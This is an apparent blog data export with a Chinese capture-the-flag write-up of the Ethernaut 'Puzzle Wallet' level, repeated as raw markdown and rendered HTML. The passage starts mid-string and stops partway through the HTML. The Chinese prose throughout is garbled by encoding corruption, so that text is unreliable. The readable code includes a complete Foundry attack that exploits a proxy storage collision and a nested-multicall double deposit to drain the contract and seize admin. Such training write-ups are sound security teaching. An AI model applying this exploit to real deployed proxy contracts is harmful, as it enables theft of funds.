\"\")`ï¼Œå°±å¯ä»¥æèµ°åˆçº¦ä¸­æ‰€æœ‰çš„èµ„é‡‘ï¼ˆæˆ‘ä»¬å­˜å…¥çš„0.001 + åˆçº¦åŸæœ‰çš„0.001ï¼‰ã€‚\n\n### æœ€ç»ˆæ”»å‡»æµç¨‹\n\n1.  **æˆä¸º `owner`**: è°ƒç”¨ `proxy.proposeNewAdmin(player)`ã€‚\n2.  **åŠ å…¥ç™½åå•**: è°ƒç”¨ `wallet.addToWhitelist(player)`ã€‚\n3.  **åŒé‡å­˜æ¬¾**: æ„é€ ä¸€ä¸ªåµŒå¥—çš„ `multicall` è°ƒç”¨ï¼Œå‘é€ 0.001 etherï¼Œä½¿è‡ªå·±çš„å­˜æ¬¾è®°å½•å˜ä¸º 0.002 etherã€‚\n4.  **æ¸…ç©ºåˆçº¦**: è°ƒç”¨ `wallet.execute(player, 0.002 ether, \"\")` æèµ°æ‰€æœ‰èµ„é‡‘ã€‚\n5.  **æˆä¸º `admin`**: è°ƒç”¨ `wallet.setMaxBalance(uint256(uint160(player)))`ï¼Œå°† `maxBalance` (å³ `admin`) è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/24_PuzzleWallet.sol\";\n\ncontract PuzzleWalletTest is Test {\n    PuzzleProxy proxy;\n    address player;\n    PuzzleWallet wallet;\n\n    function setUp() public {\n        player = vm.addr(1);\n\n        // éƒ¨ç½²é€»è¾‘åˆçº¦å’Œä»£ç†åˆçº¦\n        PuzzleWallet puzzleWallet = new PuzzleWallet();\n        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);\n        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);\n        wallet = PuzzleWallet(address(proxy));\n\n        // åˆå§‹è®¾ç½®ï¼Œå­˜å…¥ 0.001 ether\n        vm.deal(address(this), 0.001 ether);\n        wallet.addToWhitelist(address(this));\n        wallet.deposit{value: 0.001 ether}();\n    }\n\n    function testPuzzleWalletAttack() public {\n        vm.deal(player, 0.001 ether);\n        vm.startPrank(player);\n\n        // 1. æˆä¸º owner\n        proxy.proposeNewAdmin(player);\n\n        // 2. åŠ å…¥ç™½åå•\n        wallet.addToWhitelist(player);\n\n        // 3. æ„é€ åµŒå¥— multicall ä»¥å®ç°åŒé‡å­˜æ¬¾\n        bytes[] memory nestedCalls = new bytes[](1);\n        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n\n        bytes[] memory calls = new bytes[](2);\n        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);\n        \n        // å‘é€ 0.001 etherï¼Œä½†å­˜æ¬¾ä¸¤æ¬¡\n        wallet.multicall{value: 0.001 ether}(calls);\n\n        // 4. æèµ°æ‰€æœ‰èµ„é‡‘ (0.002 ether)\n        wallet.execute(player, 0.002 ether, \"\");\n\n        // 5. æˆä¸º admin\n        wallet.setMaxBalance(uint256(uint160(player)));\n\n        // éªŒè¯æˆåŠŸ\n        assertEq(proxy.admin(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **å¯¹é½å­˜å‚¨å¸ƒå±€**: åœ¨ä½¿ç”¨ä»£ç†æ¨¡å¼æ—¶ï¼Œå¿…é¡»ç¡®ä¿ä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å¸ƒå±€æ˜¯å…¼å®¹çš„ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚åœ¨ä»£ç†åˆçº¦ä¸­ä¸ºæœªæ¥çš„å‡çº§ä¿ç•™ä¸€äº›ç©ºçš„å­˜å‚¨æ§½æ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ã€‚\n2.  **ä¿®å¤ `multicall` æ¼æ´**: `multicall` ä¸­çš„é‡å…¥ä¿æŠ¤åº”è¯¥ä½¿ç”¨çŠ¶æ€å˜é‡è€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚å°† `depositCalled` å£°æ˜ä¸ºåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå¹¶åœ¨ `multicall` å¼€å§‹æ—¶è®¾ç½®ï¼Œç»“æŸæ—¶æ¸…é™¤ï¼Œå¯ä»¥é˜²æ­¢åµŒå¥—è°ƒç”¨ç»•è¿‡æ£€æŸ¥ã€‚\n3.  **åŸå­åŒ–çŠ¶æ€å˜æ›´**: é¿å…åœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­æ··åˆå¤šç§å¤æ‚é€»è¾‘ï¼ˆå¦‚å­˜æ¬¾å’Œä»»æ„ `delegatecall`ï¼‰ã€‚å°†åŠŸèƒ½åˆ†è§£ä¸ºæ›´å°ã€æ›´åŸå­åŒ–çš„å‡½æ•°å¯ä»¥å‡å°‘æ„å¤–çš„äº¤äº’ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   **ä»£ç†å­˜å‚¨å†²çª**: `delegatecall` çš„æ ¸å¿ƒé£é™©ä¹‹ä¸€ã€‚ä»£ç†å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å˜é‡å¿…é¡»ç²¾ç¡®å¯¹é½ï¼Œå¦åˆ™ä¸€ä¸ªåˆçº¦çš„å˜é‡å¯èƒ½ä¼šè¢«å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°æ„å¤–åœ°ä¿®æ”¹ã€‚\n-   **åµŒå¥— `delegatecall`**: å¯¹ `delegatecall` çš„åµŒå¥—è°ƒç”¨ä¼šç»§æ‰¿åŸå§‹è°ƒç”¨çš„ä¸Šä¸‹æ–‡ï¼ˆå¦‚ `msg.sender`, `msg.value`ï¼‰ï¼Œä½†ä¼šåˆ›å»ºæ–°çš„å±€éƒ¨å˜é‡ä½œç”¨åŸŸï¼Œè¿™å¯èƒ½è¢«ç”¨æ¥ç»•è¿‡åŸºäºå±€éƒ¨å˜é‡çš„å®‰å…¨æ£€æŸ¥ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ©ç”¨å­˜å‚¨å†²çªï¼Œé€šè¿‡è°ƒç”¨ä¸€ä¸ªçœ‹ä¼¼æ— å…³çš„å‡½æ•°ï¼ˆ`proposeNewAdmin`ï¼‰æ¥ä¿®æ”¹ä¸€ä¸ªå…³é”®çš„çŠ¶æ€å˜é‡ï¼ˆ`owner`ï¼‰ã€‚\n-   åˆ©ç”¨ `multicall` ä¸­åŸºäºå±€éƒ¨å˜é‡çš„é‡å…¥ä¿æŠ¤ç¼ºé™·ï¼Œé€šè¿‡åµŒå¥—è°ƒç”¨å®ç°åŒé‡è®°è´¦ï¼Œä»è€Œçªƒå–åˆçº¦èµ„é‡‘ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä»”ç»†è§„åˆ’å’ŒéªŒè¯ä»£ç†åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚\n-   ä½¿ç”¨çŠ¶æ€å˜é‡æ¥å®ç°é‡å…¥ä¿æŠ¤ï¼Œè€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [OpenZeppelin: Writing Upgradeable Contracts](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable)\n-   [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)","source":"_posts/ethernaut-level-24-puzzle-wallet.md","raw":"---\ntitle: 'Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´'\ndate: 2025-01-25 17:05:00\nupdated: 2025-01-25 17:05:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - é«˜çº§æ”»å‡»ç¯‡ (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - Proxy\n  - Storage Collision\n  - delegatecall\n  - multicall\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å‰–æä»£ç†åˆçº¦ï¼ˆProxyï¼‰ä¸­çš„å­˜å‚¨å¸ƒå±€å†²çªé—®é¢˜ï¼Œå¹¶åˆ©ç”¨ `multicall` å‡½æ•°ä¸­çš„é€»è¾‘æ¼æ´ç»•è¿‡é‡å…¥ä¿æŠ¤ã€‚é€šè¿‡ä¸€ç³»åˆ—ç²¾å¿ƒè®¾è®¡çš„åµŒå¥—è°ƒç”¨ï¼Œæœ€ç»ˆæå‡ä¸ºä»£ç†åˆçº¦çš„ `admin`ï¼ŒæŒæ¡ Puzzle Wallet å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 24 - Puzzle Wallet](https://ethernaut.openzeppelin.com/level/24)  \n> **æ”»å‡»ç±»å‹**: å­˜å‚¨å¸ƒå±€å†²çª / é€»è¾‘æ¼æ´  \n> **éš¾åº¦**: â­â­â­â­â­\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯æˆä¸º `PuzzleProxy` åˆçº¦çš„ `admin`ã€‚\n\n![Puzzle Wallet Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¿™æ˜¯ä¸€ä¸ªæ¶‰åŠä»£ç†åˆçº¦ï¼ˆProxyï¼‰çš„å¤æ‚æŒ‘æˆ˜ï¼ŒåŒ…å«äº†å¤šä¸ªæ¼æ´çš„ç»„åˆåˆ©ç”¨ã€‚æˆ‘ä»¬éœ€è¦åˆ†æ­¥è§£å†³å‡ ä¸ªå­é—®é¢˜ã€‚\n\n### æ¼æ´ 1: ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\n\né¦–å…ˆï¼Œæˆ‘ä»¬æ£€æŸ¥ `PuzzleProxy` (ä»£ç†) å’Œ `PuzzleWallet` (é€»è¾‘) åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚\n\n**`PuzzleProxy` çš„å­˜å‚¨:**\n```solidity\ncontract PuzzleProxy is Proxy {\n    address public pendingAdmin; // slot 0\n    address public admin;      // slot 1\n    // ...\n}\n```\n\n**`PuzzleWallet` çš„å­˜å‚¨:**\n```solidity\ncontract PuzzleWallet is Ownable {\n    address public owner;      // slot 0 (ç»§æ‰¿è‡ª Ownable)\n    uint256 public maxBalance; // slot 1\n    mapping(address => bool) public whitelisted; // slot 2\n    // ...\n}\n```\n\nç”±äºä»£ç†æ¨¡å¼ä½¿ç”¨ `delegatecall`ï¼Œ`PuzzleWallet` çš„ä»£ç ä¼šç›´æ¥æ“ä½œ `PuzzleProxy` çš„å­˜å‚¨ã€‚è¿™å°±å¯¼è‡´äº†å­˜å‚¨æ§½çš„å†²çªï¼š\n\n-   `PuzzleProxy` çš„ `pendingAdmin` (slot 0) å®é™…ä¸Šå¯¹åº” `PuzzleWallet` çš„ `owner` (slot 0)ã€‚\n-   `PuzzleProxy` çš„ `admin` (slot 1) å®é™…ä¸Šå¯¹åº” `PuzzleWallet` çš„ `maxBalance` (slot 1)ã€‚\n\næˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯æˆä¸º `PuzzleProxy` çš„ `admin`ã€‚æ ¹æ®å­˜å‚¨å†²çªï¼Œ**æˆ‘ä»¬åªéœ€è¦å°† `PuzzleWallet` çš„ `maxBalance` è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€å³å¯**ã€‚\n\n### æ¼æ´ 2: æˆä¸º `owner` å¹¶åŠ å…¥ç™½åå•\n\nè¦è°ƒç”¨ `setMaxBalance()`ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ç™½åå•ç”¨æˆ·ã€‚è¦åŠ å…¥ç™½åå•ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ `PuzzleWallet` çš„ `owner`ã€‚\n\n-   `PuzzleWallet` çš„ `owner` å­˜å‚¨åœ¨ slot 0ã€‚\n-   `PuzzleProxy` çš„ `proposeNewAdmin()` å‡½æ•°å¯ä»¥ä¿®æ”¹ `pendingAdmin`ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹ slot 0ã€‚\n\nå› æ­¤ï¼Œç¬¬ä¸€æ­¥æ˜¯é€šè¿‡è°ƒç”¨ `proxy.proposeNewAdmin(player_address)` æ¥å°† `wallet.owner` è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚\n\næˆä¸º `owner` åï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ `wallet.addToWhitelist(player_address)` å°†è‡ªå·±åŠ å…¥ç™½åå•ã€‚\n\n### æ¼æ´ 3: `multicall` é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\n\nç°åœ¨æˆ‘ä»¬æ˜¯ç™½åå•ç”¨æˆ·äº†ï¼Œä½† `setMaxBalance()` è¿˜æœ‰ä¸€ä¸ªè¦æ±‚ï¼š`require(address(this).balance == 0, \"Contract balance is not 0\")`ã€‚åˆçº¦åœ¨éƒ¨ç½²æ—¶è¢«å­˜å…¥äº† 0.001 etherï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°†åˆçº¦ä½™é¢æ¸…ç©ºã€‚\n\n`execute()` å‡½æ•°å¯ä»¥ææ¬¾ï¼Œä½†æˆ‘ä»¬åªèƒ½æå‡ºæˆ‘ä»¬å­˜å…¥çš„é‡‘é¢ã€‚é—®é¢˜åœ¨äºåˆçº¦ä¸­å·²æœ‰çš„ 0.001 etherã€‚\n\nå…³é”®åœ¨äº `multicall()` å‡½æ•°ï¼š\n\n```solidity\nfunction multicall(bytes[] calldata data) external payable onlyWhitelisted {\n    bool depositCalled = false;\n    for (uint i = 0; i < data.length; i++) {\n        // ...\n        if (selector == this.deposit.selector) {\n            require(!depositCalled, \"Deposit can only be called once\");\n            depositCalled = true;\n        }\n        (bool success, ) = address(this).delegatecall(data[i]);\n        // ...\n    }\n}\n```\n\nå‡½æ•°é€šè¿‡ `depositCalled` æ ‡å¿—ä½æ¥é˜²æ­¢åœ¨ä¸€æ¬¡ `multicall` ä¸­å¤šæ¬¡è°ƒç”¨ `deposit()`ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªä¿æŠ¤æªæ–½æ˜¯æœ‰ç¼ºé™·çš„ã€‚`depositCalled` æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå®ƒçš„ä½œç”¨åŸŸä»…é™äºå•æ¬¡ `multicall` è°ƒç”¨ã€‚å¦‚æœæˆ‘ä»¬**åœ¨ä¸€ä¸ª `multicall` è°ƒç”¨ä¸­åµŒå¥—å¦ä¸€ä¸ª `multicall` è°ƒç”¨**ï¼Œé‚£ä¹ˆå†…éƒ¨çš„ `multicall` ä¼šæœ‰è‡ªå·±çš„ã€å…¨æ–°çš„ `depositCalled` æ ‡å¿—ä½ã€‚\n\nè¿™å…è®¸æˆ‘ä»¬ç»•è¿‡æ£€æŸ¥ï¼Œå®ç°â€œåŒé‡å­˜æ¬¾â€ï¼š\n\n1.  æˆ‘ä»¬å‘ `multicall` å‘é€ 0.001 etherã€‚\n2.  `multicall` çš„ç¬¬ä¸€ä¸ªè°ƒç”¨æ˜¯ `deposit()`ã€‚è¿™ä¼šæŠŠæˆ‘ä»¬çš„ `msg.value` (0.001 ether) å­˜å…¥ï¼Œå¹¶å°†æˆ‘ä»¬çš„ä½™é¢è®°å½•ä¸º 0.001 etherã€‚\n3.  `multicall` çš„ç¬¬äºŒä¸ªè°ƒç”¨æ˜¯**å¯¹ `multicall` è‡ªèº«çš„åµŒå¥—è°ƒç”¨**ã€‚åœ¨è¿™ä¸ªåµŒå¥—è°ƒç”¨ä¸­ï¼Œæˆ‘ä»¬å†æ¬¡è°ƒç”¨ `deposit()`ã€‚\n4.  ç”±äº `delegatecall` çš„ç‰¹æ€§ï¼Œ`msg.value` åœ¨åµŒå¥—è°ƒç”¨ä¸­ä¿æŒä¸å˜ã€‚å› æ­¤ï¼Œç¬¬äºŒæ¬¡ `deposit()` ä¼šå†æ¬¡å°†åŒä¸€ä¸ª `msg.value` (0.001 ether) å­˜å…¥ï¼Œä½¿æˆ‘ä»¬çš„è®°å½•ä½™é¢å˜ä¸º 0.002 etherã€‚\n\næˆ‘ä»¬åªå‘é€äº† 0.001 etherï¼Œä½†åœ¨åˆçº¦ä¸­çš„å­˜æ¬¾è®°å½•å´æ˜¯ 0.002 etherã€‚ç°åœ¨ï¼Œæˆ‘ä»¬è°ƒç”¨ `execute(player, 0.002 ether, \"\")`ï¼Œå°±å¯ä»¥æèµ°åˆçº¦ä¸­æ‰€æœ‰çš„èµ„é‡‘ï¼ˆæˆ‘ä»¬å­˜å…¥çš„0.001 + åˆçº¦åŸæœ‰çš„0.001ï¼‰ã€‚\n\n### æœ€ç»ˆæ”»å‡»æµç¨‹\n\n1.  **æˆä¸º `owner`**: è°ƒç”¨ `proxy.proposeNewAdmin(player)`ã€‚\n2.  **åŠ å…¥ç™½åå•**: è°ƒç”¨ `wallet.addToWhitelist(player)`ã€‚\n3.  **åŒé‡å­˜æ¬¾**: æ„é€ ä¸€ä¸ªåµŒå¥—çš„ `multicall` è°ƒç”¨ï¼Œå‘é€ 0.001 etherï¼Œä½¿è‡ªå·±çš„å­˜æ¬¾è®°å½•å˜ä¸º 0.002 etherã€‚\n4.  **æ¸…ç©ºåˆçº¦**: è°ƒç”¨ `wallet.execute(player, 0.002 ether, \"\")` æèµ°æ‰€æœ‰èµ„é‡‘ã€‚\n5.  **æˆä¸º `admin`**: è°ƒç”¨ `wallet.setMaxBalance(uint256(uint160(player)))`ï¼Œå°† `maxBalance` (å³ `admin`) è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/24_PuzzleWallet.sol\";\n\ncontract PuzzleWalletTest is Test {\n    PuzzleProxy proxy;\n    address player;\n    PuzzleWallet wallet;\n\n    function setUp() public {\n        player = vm.addr(1);\n\n        // éƒ¨ç½²é€»è¾‘åˆçº¦å’Œä»£ç†åˆçº¦\n        PuzzleWallet puzzleWallet = new PuzzleWallet();\n        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);\n        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);\n        wallet = PuzzleWallet(address(proxy));\n\n        // åˆå§‹è®¾ç½®ï¼Œå­˜å…¥ 0.001 ether\n        vm.deal(address(this), 0.001 ether);\n        wallet.addToWhitelist(address(this));\n        wallet.deposit{value: 0.001 ether}();\n    }\n\n    function testPuzzleWalletAttack() public {\n        vm.deal(player, 0.001 ether);\n        vm.startPrank(player);\n\n        // 1. æˆä¸º owner\n        proxy.proposeNewAdmin(player);\n\n        // 2. åŠ å…¥ç™½åå•\n        wallet.addToWhitelist(player);\n\n        // 3. æ„é€ åµŒå¥— multicall ä»¥å®ç°åŒé‡å­˜æ¬¾\n        bytes[] memory nestedCalls = new bytes[](1);\n        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n\n        bytes[] memory calls = new bytes[](2);\n        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);\n        \n        // å‘é€ 0.001 etherï¼Œä½†å­˜æ¬¾ä¸¤æ¬¡\n        wallet.multicall{value: 0.001 ether}(calls);\n\n        // 4. æèµ°æ‰€æœ‰èµ„é‡‘ (0.002 ether)\n        wallet.execute(player, 0.002 ether, \"\");\n\n        // 5. æˆä¸º admin\n        wallet.setMaxBalance(uint256(uint160(player)));\n\n        // éªŒè¯æˆåŠŸ\n        assertEq(proxy.admin(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **å¯¹é½å­˜å‚¨å¸ƒå±€**: åœ¨ä½¿ç”¨ä»£ç†æ¨¡å¼æ—¶ï¼Œå¿…é¡»ç¡®ä¿ä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å¸ƒå±€æ˜¯å…¼å®¹çš„ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚åœ¨ä»£ç†åˆçº¦ä¸­ä¸ºæœªæ¥çš„å‡çº§ä¿ç•™ä¸€äº›ç©ºçš„å­˜å‚¨æ§½æ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ã€‚\n2.  **ä¿®å¤ `multicall` æ¼æ´**: `multicall` ä¸­çš„é‡å…¥ä¿æŠ¤åº”è¯¥ä½¿ç”¨çŠ¶æ€å˜é‡è€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚å°† `depositCalled` å£°æ˜ä¸ºåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå¹¶åœ¨ `multicall` å¼€å§‹æ—¶è®¾ç½®ï¼Œç»“æŸæ—¶æ¸…é™¤ï¼Œå¯ä»¥é˜²æ­¢åµŒå¥—è°ƒç”¨ç»•è¿‡æ£€æŸ¥ã€‚\n3.  **åŸå­åŒ–çŠ¶æ€å˜æ›´**: é¿å…åœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­æ··åˆå¤šç§å¤æ‚é€»è¾‘ï¼ˆå¦‚å­˜æ¬¾å’Œä»»æ„ `delegatecall`ï¼‰ã€‚å°†åŠŸèƒ½åˆ†è§£ä¸ºæ›´å°ã€æ›´åŸå­åŒ–çš„å‡½æ•°å¯ä»¥å‡å°‘æ„å¤–çš„äº¤äº’ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   **ä»£ç†å­˜å‚¨å†²çª**: `delegatecall` çš„æ ¸å¿ƒé£é™©ä¹‹ä¸€ã€‚ä»£ç†å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å˜é‡å¿…é¡»ç²¾ç¡®å¯¹é½ï¼Œå¦åˆ™ä¸€ä¸ªåˆçº¦çš„å˜é‡å¯èƒ½ä¼šè¢«å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°æ„å¤–åœ°ä¿®æ”¹ã€‚\n-   **åµŒå¥— `delegatecall`**: å¯¹ `delegatecall` çš„åµŒå¥—è°ƒç”¨ä¼šç»§æ‰¿åŸå§‹è°ƒç”¨çš„ä¸Šä¸‹æ–‡ï¼ˆå¦‚ `msg.sender`, `msg.value`ï¼‰ï¼Œä½†ä¼šåˆ›å»ºæ–°çš„å±€éƒ¨å˜é‡ä½œç”¨åŸŸï¼Œè¿™å¯èƒ½è¢«ç”¨æ¥ç»•è¿‡åŸºäºå±€éƒ¨å˜é‡çš„å®‰å…¨æ£€æŸ¥ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ©ç”¨å­˜å‚¨å†²çªï¼Œé€šè¿‡è°ƒç”¨ä¸€ä¸ªçœ‹ä¼¼æ— å…³çš„å‡½æ•°ï¼ˆ`proposeNewAdmin`ï¼‰æ¥ä¿®æ”¹ä¸€ä¸ªå…³é”®çš„çŠ¶æ€å˜é‡ï¼ˆ`owner`ï¼‰ã€‚\n-   åˆ©ç”¨ `multicall` ä¸­åŸºäºå±€éƒ¨å˜é‡çš„é‡å…¥ä¿æŠ¤ç¼ºé™·ï¼Œé€šè¿‡åµŒå¥—è°ƒç”¨å®ç°åŒé‡è®°è´¦ï¼Œä»è€Œçªƒå–åˆçº¦èµ„é‡‘ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä»”ç»†è§„åˆ’å’ŒéªŒè¯ä»£ç†åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚\n-   ä½¿ç”¨çŠ¶æ€å˜é‡æ¥å®ç°é‡å…¥ä¿æŠ¤ï¼Œè€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [OpenZeppelin: Writing Upgradeable Contracts](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable)\n-   [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)","slug":"ethernaut-level-24-puzzle-wallet","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpl001tbf5qd5j7613o","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-24-Puzzle-Wallet-ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-24-Puzzle-Wallet-ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\"></a>ğŸ¯ Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/24\">Ethernaut Level 24 - Puzzle Wallet</a><br><strong>æ”»å‡»ç±»å‹</strong>: å­˜å‚¨å¸ƒå±€å†²çª &#x2F; é€»è¾‘æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯æˆä¸º <code>PuzzleProxy</code> åˆçº¦çš„ <code>admin</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg\" alt=\"Puzzle Wallet Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¿™æ˜¯ä¸€ä¸ªæ¶‰åŠä»£ç†åˆçº¦ï¼ˆProxyï¼‰çš„å¤æ‚æŒ‘æˆ˜ï¼ŒåŒ…å«äº†å¤šä¸ªæ¼æ´çš„ç»„åˆåˆ©ç”¨ã€‚æˆ‘ä»¬éœ€è¦åˆ†æ­¥è§£å†³å‡ ä¸ªå­é—®é¢˜ã€‚</p>\n<h3 id=\"æ¼æ´-1-ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\"><a href=\"#æ¼æ´-1-ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\" class=\"headerlink\" title=\"æ¼æ´ 1: ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\"></a>æ¼æ´ 1: ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ£€æŸ¥ <code>PuzzleProxy</code> (ä»£ç†) å’Œ <code>PuzzleWallet</code> (é€»è¾‘) åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚</p>\n<p><strong><code>PuzzleProxy</code> çš„å­˜å‚¨:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleProxy is Proxy &#123;</span><br><span class=\"line\">    address public pendingAdmin; // slot 0</span><br><span class=\"line\">    address public admin;      // slot 1</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong><code>PuzzleWallet</code> çš„å­˜å‚¨:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleWallet is Ownable &#123;</span><br><span class=\"line\">    address public owner;      // slot 0 (ç»§æ‰¿è‡ª Ownable)</span><br><span class=\"line\">    uint256 public maxBalance; // slot 1</span><br><span class=\"line\">    mapping(address =&gt; bool) public whitelisted; // slot 2</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ç”±äºä»£ç†æ¨¡å¼ä½¿ç”¨ <code>delegatecall</code>ï¼Œ<code>PuzzleWallet</code> çš„ä»£ç ä¼šç›´æ¥æ“ä½œ <code>PuzzleProxy</code> çš„å­˜å‚¨ã€‚è¿™å°±å¯¼è‡´äº†å­˜å‚¨æ§½çš„å†²çªï¼š</p>\n<ul>\n<li><code>PuzzleProxy</code> çš„ 